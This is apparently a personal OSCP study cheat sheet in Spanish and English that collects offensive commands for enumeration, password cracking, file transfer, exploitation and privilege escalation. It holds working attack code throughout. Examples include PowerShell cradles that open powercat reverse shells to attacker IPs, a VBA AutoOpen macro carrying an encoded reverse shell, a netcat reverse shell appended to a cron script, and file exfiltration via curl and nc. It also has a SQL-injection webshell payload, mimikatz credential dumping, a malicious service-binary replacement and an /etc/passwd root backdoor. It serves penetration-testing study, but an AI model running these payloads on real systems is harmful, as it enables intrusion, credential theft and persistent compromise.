- [OSCP](#Commands)
- [Enumeracion](#Enumeracion)
- [Password Attacks](#password-attacks)
- [File Transfers](#file-transfers)
- [Ofuscación](#ofuscacion)
- [Explotacion](#explotacion)
- [Persistencia](#persistencia)
- [Escalada de privilegios](#escalada-de-privilegios)
- [Pivoting](#pivoting)
- [Evasion de antivirus](#evasion-de-antivirus)
- [Exfiltración de datos](#exfiltración-de-datos)
- [Limpiando huellas](#limpiando-huellas)
- [Tips](#tips)

# Commands

Comandos y herramientas que se encuentran en el documento de PWK

Recuerden poner siempre el host 

echo 'IP NOMBRE.htb' | sudo tee -a /etc/hosts

Para poder conectarse a una maquina podemos usar alguno de los siguientes comandos

evil-winrm -u USER -p PASS -i IP

## Convvertir ST a kirbi a ccache para psexec

base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass

# Enumeracion

## RPC

```sh
rpcclient --user '' --workgroup active.htb --no-pass 10.10.10.100
crackmapexec wmi 10.10.10.100 -u '' -p ''
```

## Nmap
```sh
sudo nmap --script-updatedb
sudo nmap -p- --open -vvv --min-rate 5000 -sS -Pn 10.10.10.4 -oN nmap
sudo nmap -sVC -p135,139,445 10.10.10.4 -oN nmap.service
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
```

## LDAP

sudo apt install ldap-utils

Esto permite hacer un dump completo dependiendo del usuario y la contrasena

ldapdomaindump 'ldap://support.htb' -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

Si queremos GUI, podemos usar

Apache Directory Studio -> https://directory.apache.org/studio/
```sh
crackmapexec ldap 10.10.10.100 -u '' -p ''
```
## DNS

```sh
whois megacorpone.com -h 192.168.50.251
whois 38.100.193.70 -h 192.168.50.251
```

Usar google hacking

filetype:txt
site:megacorpone.com
intitle:“index of” “parent directory”
```sh
host -t mx megacorpone.com
host -t txt megacorpone.com
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
dnsenum megacorpone.com
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## TCP/UDP

```sh
nc -nvv -w 1 -z 192.168.50.152 3388-3390
nc -nv -u -z -w 1 192.168.50.149 120-123
```

### Powershell

```cmd
Test-NetConnection -Port 445 192.168.50.151 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

## SMB
```sh
sudo nbtscan -r 192.168.50.0/24

Ver los shares

smbclient -L \\\\IP\\

Acceder a los shares

smbclient \\\\IP\\SHARE
```
## Directorios
```sh
gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 

-w /usr/share/wordlists/dirb/common.txt  
```

## SNMP

| Identificador | Información |
|---|---|
|1.3.6.1.2.1.25.1.6.0 | System Processes
|1.3.6.1.2.1.25.4.2.1.2 | Running Programs
|1.3.6.1.2.1.25.4.2.1.4 | Processes Path
|1.3.6.1.2.1.25.2.3.1.4 | Storage Units
|1.3.6.1.2.1.25.6.3.1.2 | Software Name
|1.3.6.1.4.1.77.1.2.25 | User Accounts
|1.3.6.1.2.1.6.13.1.3 |TCP Local Ports

sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt


Realiza un bruteforce
```sh
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips

Scanning 254 hosts, 3 communities
192.168.50.151 [public] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

```sh
snmpwalk -c public -v1 -t 10 192.168.50.151

iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.3
iso.3.6.1.2.1.1.3.0 = Timeticks: (78235) 0:13:02.35
iso.3.6.1.2.1.1.4.0 = STRING: "admin@megacorptwo.com"
iso.3.6.1.2.1.1.5.0 = STRING: "dc01.megacorptwo.com"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 79
iso.3.6.1.2.1.2.1.0 = INTEGER: 2
```

Se puede utilizar la tabla para enumerar, por ejemplo usuarios

```sh
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
```

## API
```sh
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

pattern

```sh
{GOBUSTER}/v1
{GOBUSTER}/v2
```

## Windows 

### Security Identifier (SID)

SID is a unique value assigned to each entity, or principal, that can be authenticated by Windows, such as users and groups. The SID for local accounts and groups is generated by the Local Security Authority (LSA),737 and for domain users and domain groups, it’s generated on a Domain Controller (DC). The SID cannot be changed and is generated when the user or group is created

S-R-X-Y

“S”, which indicates that the string is a SID.
“R” stands for revision and is always set to “1”
“X” determines the identifier authority. 5 isthe authority
“Y” represents the sub authorities of the identifier authority


S-1-0-0 Nobody 
S-1-1-0 Everybody
S-1-5-11 Authenticated Users
S-1-5-18 Local System
S-1-5-domainidentifier-500 Administrator

List of Well known SIDs on local machines

### Access token

Once a user is authenticated, Windows generates an access token that is assigned to that user. The token itself contains various pieces of information that effectively describe the security context of a given user. The security context is a set of rules or attributes that are currently in effect.

The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token.

When a user starts a process or thread, a token will be assigned to these objects. This token, called a primary token, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user.

A thread can also have an impersonation token739 assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the 

Thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

### Mandatory Integrity Control

It uses integrity levels to control access to securable objects. We can think of these levels as hierarchies of trust Windows has in a running application or securable objectWhen processes are started or objects are created, they receive the integrity level of the principal performing this operation. One exception is if an executable file has a low integrity level, the process’s integrity level will also be low. A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so

- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data

### User Account Control

UAC is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or filtered admin token), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a UAC consent prompt742 needs to be confirmed

There are several key pieces of information we should always obtain:

- Username and hostname
```cmd
whoami
```
- Group memberships of the current user
```cmd
whoami /groups
```
- Existing users and groups
```cmd
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember [USER]
Get-LocalGroupMember Administrators
net user [USER]
```
- Operating system, version and architecture
```cmd
systeminfo
```
- Network information
```cmd
ipconfig /all
route print
netstat -ano
```
- Installed applications
```cmd
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
- Running processes
```cmd
Get-Process
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
- Running process with other user
```cmd
runas /user:backupadmin cmd
```

- History
```cmd
Get-History
(Get-PSReadlineOption).HistorySavePath
```

Obtener el Domain
``` cmd
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### Service Principal Names

c:\Tools>setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
 HTTP/web04.corp.com
 HTTP/web04
 HTTP/web04.corp.com:80

Get-NetUser -SPN | select samaccountname,serviceprincipalname
samaccountname serviceprincipalname
-------------- --------------------
krbtgt kadmin/changepw
iis_service {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80

nslookup.exe web04.corp.com

## LLMNR/NBT-NS

You can Man in The Middle using LLMNR and NBT-NS if they're bad configured
```sh
sudo responder -I eth0 -wFv
```
# If you get hashes, will be necessary to crack them
```sh
john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt 
```
## Tools

### Certipy
https://github.com/ly4k/Certipy

### FullPowers
https://github.com/itm4n/FullPowers
FullPowers is a Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
```cmd
FullPowers
FullPowers -c "powershell -ep Bypass"
FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```
### LinEnum
https://github.com/rebootuser/LinEnum

### linuxprivchecker
https://github.com/sleventyeleven/linuxprivchecker
```sh
python linuxprivchecker.py -w -o linuxprivchecker.log
```
### mimikatz
https://github.com/ParrotSec/mimikatz

### PowerCat
https://github.com/besimorhino/powercat

### Powermad
https://github.com/Kevin-Robertson/Powermad

### PowerView
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon


### PrivescCheck

Cargar el script
```cmd
. .\PrivescCheck.ps1

Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1

Get-Content .\PrivescCheck.ps1 | Out-String | IEX
```
Uso 
```sh
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)"
```

### Rubeus
https://github.com/GhostPack/Rubeus

### SharpHound
https://github.com/BloodHoundAD/SharpHound



### username-anarchy
https://github.com/urbanadventurer/username-anarchy

Formatos
```sh
./username-anarchy --list-formats
Plugin name         	Example
--------------------------------------------------------------------------------
first               	anna
firstlast           	annakey
first.last          	anna.key
firstlast[8]        	annakey
firstl              	annak
f.last              	a.key
flast               	akey
lfirst              	kanna
l.first             	k.anna
lastf               	keya
last                	key
last.f              	key.a
last.first          	key.anna
FLast               	AKey
first1              	anna0,anna1,anna2
fl                  	ak
fmlast              	abkey
firstmiddlelast     	annaboomkey
fml                 	abk
FL                  	AK
FirstLast           	AnnaKey
First.Last          	Anna.Key
Last                	Key
FML                 	ABK
```
```sh
./username-anarchy --input-file ./test-names.txt  --select-format first.last
andrew.horton
jim.vongrippenvud
peter.otoole
```
### windapsearch
windapsearch is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.
```sh
./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -U
./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -s albert
./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -C -r
windapsearch# ./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 --da
```
### accesschk
```cmd
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]
```
// Find all weak folder permissions per drive.
```cmd
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```
// Find all weak file permissions per drive.
```cmd
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
### Git

https://github.com/arthaud/git-dumper.git


# Password Attacks


```sh
ncrack -vv --user rax -P wordlist.txt rdp://1.1.1.1

medusa -h 1.1.1.1 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh

hydra -l administrator -P wordlist.txt 1.1.1.1 ssh

hydra 1.1.1.1:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
```

## GPO

gpp-decrypt GROUPPOLICYPASSWORD

Estos se encuentran en un xml 
Example -> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

## Creacion de diccionario
```sh
crunch 6 6 -t Lab%%% > wordlist

cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
```
## SSH 
```sh
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
Aqui hay que tomar en cuenta el valor del $6 para ver cuál hace match en hashcat
```sh
hashcat -h | grep -i "ssh"
ssh2john id_rsa > ssh.hash

hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```
Es posible que hashcat tire un error, para eso podemos usar john
En caso de que tengamos un custom rule:
```sh
$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```
## RDP
```sh
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
## HTTP
```sh
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
## Keepass
```sh
keepass2john Database.kdbx > keepass.hash 
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
john --wordlist=/usr/share/john/password.lst --rules jeeves.hash 
```
## Contraseñas de windows

Primero localizar cuales usuarios hay y correr mimikatz, recordar que se ocupa admin
```cmd
Get-LocalUser
.\mimikatz.exe
```
Trata de recuperar contraseñas
```cmd
sekurlsa::logonpasswords
```
Trata de recuperar NTLM hashes
```cmd
lsadump::sam
```
Algunos comandos como estos ocupan priivlegios elevados, es por eso que debemos utilizar 
```cmd
token::elevate

mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18 
(04g,21p) Primary
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-
4264639230-2296035194-3358247000-1001 (14g,24p) Primary
* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18 
(04g,21p) Impersonation (Delegation)
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
RID : 000003e9 (1001)
User : offsec
 Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
RID : 000003ea (1002)
User : nelly
 Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```
## NTLM
```sh
hashcat --help | grep -i "ntlm" 
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
## NTLMv2
```cmd
nc 192.168.50.211 4444
C:\Windows\system32> whoami
whoami
files01\paul

net user paul
```
Revisar si está en el grupo de RDP
```cmd
Local Group Memberships *Remote Desktop Users *Users
```
Desde nuestra máquina lanzamos el responder con la interfaz de SMB habilitado
```sh
ip a
sudo responder -I tap0
```
Desde la máquina victima intentar acceder a un share
```cmd
dir \\192.168.119.2\test
```
Y desde el responder deberíamos de encontrar el hash
```cmd
[+] Listening for events... 
[SMB] NTLMv2-SSP Client : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash : 
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
CD1777D801B7585DF5719ACFBA0000000....00
```
```sh
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```


## Password Generation with cewl and John 

```sh
cewl http://1.1.1.1/index.html >> words.txt

john --wordlist=words.txt --rules --stdout >> wordlist.txt
```

## Cracking Hashes - Linux 

```sh
cat shadow.txt | awk -F':' '{print }' > hashes.txt

hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Cracking Hashes - Windows 

```sh
hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt
```

# File Transfers


wget
```sh
wget -O exploit.c 10.10.10.10/exploit.c
```

Curl Upload
```cmd
curl --upload-file /etc/passwd http://10.10.10.10
```

## Pasar archivos de windows a mi maquina
```sh
nc.exe -w 3 10.10.14.45 1235 < archivo.kdbx
nc -lp 1235 > miarchivo.kdbx
```

## Descargar desde powershell
```cmd
EX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
iwr -uri http://10.10.14.65:8000/SharpHound.exe -Outfile SharpHound.exe

En memoria 

iex (New-Object net.webclient).Downloadstring('http://10.10.14.217:8000/PowerView.ps1')

Bypass-4MSI para bypasear al Windows Defender
Invoke-Binary para mandar un binario desde la conexión con tu máquina de atacante, puedes dar tab para que él te muestre donde está (básicamente pwd en tu máquina) y escribes el nombre del archivo
```

## TFTP

### Local (start the service)

```sh
atftpd --daemon --port 69 /tftp
```

### Remote
```sh
tftp -i 10.10.10.10 get nc.exe
```

### Windows FTP 
```sh
echo USER>> ftp.txt 
echo offsec>>ftp.txt 
echo lab123>>ftp.txt
echo binary>>ftp.txt
echo get nc.exe>> ftp.txt 
echo bye>> ftp.txt 
ftp -v -n -s:ftp.txt 10.10.10.10
```

### PowerShell

```sh
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.10.10.10/fgdump.exe" >>wget.ps1 
echo $file = "new.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


# Ofuscacion


 

# Explotacion

## Agregar un usuario a windows para luego dumpear hash - POWERVIEW

Exchange windows permissions permite modificar permisos, grupos y usuarios. Esto nos permite luego dumpear las hashes con secretsdump
Funciona SOLAMENTE si se tiene los permisos y los grupos de "Exchange Windows Permissions" y "Remote Management Users"

```sh
net user ema password123 /add /domain 
net group "Exchange Windows Permissions" ema /add
net localgroup "Remote Management Users" ema /add
$pass = Convertto-SecureString "password123" -AsPlain -force
$cred = New-Object System.management.automation.pscredential ("HTB\ema",$pass)
add-objectacl -principalidentity ema -credential $cred -rights DCSync

impacket-secretsdump HTB.local/ema@10.10.10.161
```
## Macros

Pasar esto a base64
```sh
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```
Convertir este base64 en chunks de 50 caracteres 

```py
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```
Pegarlo en el macro
```sh
Sub AutoOpen()
 MyMacro
End Sub
Sub Document_Open()
 MyMacro
End Sub
Sub MyMacro()
 Dim Str As String
 
 Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
 Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
 Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
 ...
 Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
 Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
 Str = Str + "A== "
 CreateObject("Wscript.Shell").Run Str
End Sub
```
Esperar conexión

```sh
nc -nvlp 4444
```

## MYSQL
```sql
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
## MSSQL

```sql
SELECT @@version;
SELECT name FROM sys.databases;
select * from offsec.dbo.users;
SELECT * FROM offsec.information_schema.tables;

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

## SQLMAP
```sh
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp" 
```
### Code Execution

```sql
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' 
changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 
0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
output
--------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
nt service\mssql$sqlexpress
NULL
```
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

## Windows Library Files

### Dependencias 

```sh
pip3 install wsgidav 
```

Nos permite compartir un directorio compartido WebDAV 

```sh
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

Para crear la librería se utilizará `xfreerdp`

Vamos a crear un archivo con nuestro propia ip 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

## Pass the hash

Esto nos permite ver cuáles archivos podemos acceder con el hash
```cmd
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
get file.txt
```
En este caso vamos a obtener un shell interactivo, psexec tratará de buscar un share con permisos de escritura, sube un ejecutable, lo registra como un servicio y lo inicia.
```sh
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
Otro tool puede ser
```sh
impacket-wmiexec -hashes  00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Kerberoasting
```sh
Se enumera si es posible connectarse

GetUserSPNs.py domain.htb/USER -dc-ip IP 

Este permite solitiar el ST

GetUserSPNs.py domain.htb/USER -dc-ip IP -request
```

## Net-NTLMv2 Relay

La base64 es un rev shell 
```sh
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
Abrimos el puerto en escucha 
```sh
nc -nvlp 8080
```
Nos conectamos a la maquina
```cmd
nc 192.168.50.211 5555 
C:\Windows\system32>whoami
whoami
files01\files02admin
C:\Windows\system32>dir \\192.168.119.2\test
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target 
smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more 
targets left!
...
[*] Executed specified command on host: 192.168.50.212
```
Ya con esto deberíamos ser capaces de obtener root en la maquina

## Active directory



# Persistencia
```sh
nano /etc/ssh/sshd_config
Change port 22 into 2222 and save the file. <Al hacer nmap al host el 22 cambia a 2222>
Then restart ssh

En la maquina local:

'sh-keygen'
'cd .ssh'
'ls'
'cat id_rsa.pub > authorized_keys'
'nano /etc/ssh/sshd_config'
Change passwordauthentication no

```

# Escalada de privilegios

Interactive Shells 

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

Linux Commands
```sh
uname -a
id
cat /etc/*-release
cat /proc/version
cat /etc/issue
ifconfig -a
netstat -ano 
netstat --tcp
netstat -s --tcp
nmap -p - -sV localhost
cat /etc/passwd
cat /etc/hosts
arp -a
iptables -L
crontab -l
cat /root/.ssh/known_hosts
find . -name "*password*"
cat /etc/iptables/rules.v4
ss -anp
ls -lah /etc/cron*
crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo [KERNEL MODULE]
env
cat .bashrc
```

## SearchSploit root Proceses

```sh
cat process.txt | grep root | cut -d " " -f 9 | grep "\[" | cut -d "[" -f 2 | cut -d "]" -f1 | cut -d "/" -f1  >> root_process.txt 
cat root_process.txt | sort -u > proccess.txt 
for i in `cat process.txt` ; do  searchsploit %i ; done
```
## Linux

## Procesos 

```sh
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...
joe 16867 0.0 0.1 6352 2996 pts/0 S+ 05:41 0:00 watch -n 1 ps -aux | 
grep pass
root 16880 0.0 0.0 2384 756 ? S 05:41 0:00 sh -c sshpass -p 
'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
root 16881 0.0 0.0 2356 1640 ? S 05:41 0:00 sshpass -p zzzzzz ssh 
-t eve@127.0.0.1 sleep 5;exit
```

```sh
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab
```
## Cronjobs 
```sh
grep "CRON" /var/log/syslog
```
Si tenemos acceso a un ejecutable entonces podemos poner el siguiente codigo
```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" >> user_backups.sh
```
## passwd
```sh
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g
joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> 
/etc/passwd
joe@debian-privesc:~$ su root2
Password: w00t
root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```
## Kernel Vulnerabilities
```sh
cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic
joe@ubuntu-privesc:~$ arch
x86_64
```
```sh
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep 
"4." | grep -v " < 4.4.0" | grep -v "4.8"
```
## Windows 

WinRM

Esto es utilizado en caso de que nuestro bash este fallando mucho, es para mejorarlo:)
```cmd
evil-winrm -i 192.168.50.220 -u USER -p "PASS"
```
Winpeas
```cmd
powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```
## Servicios
```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\xampp\apache\bin\httpd.exe"
```
El output puede tirar alguno de estos permisos

| Mask | Permissions | 
|---|---|
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

En caso de encontrar un F, se puede sobreescribir el archivo y reemplazarlo
```c
#include <stdlib.h>
int main ()
{
 int i;
 
 i = system ("net user dave2 password123! /add");
 i = system ("net localgroup administrators dave2 /add");
 
 return 0;
}
```
```cmd
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe 
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net stop mysql
```
Si no tenemos los permisos suficientes, podemos revisar si tenemos acceso a reiniciar la maquina
```cmd
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv
shutdown /r /t 0
```
Ya deberíamos de ser admin
```cmd
Get-LocalGroupMember administrators
```
## PowerUp
```cmd
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```
## DLL Hijack

Standard DLL search order on current Windows versions

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
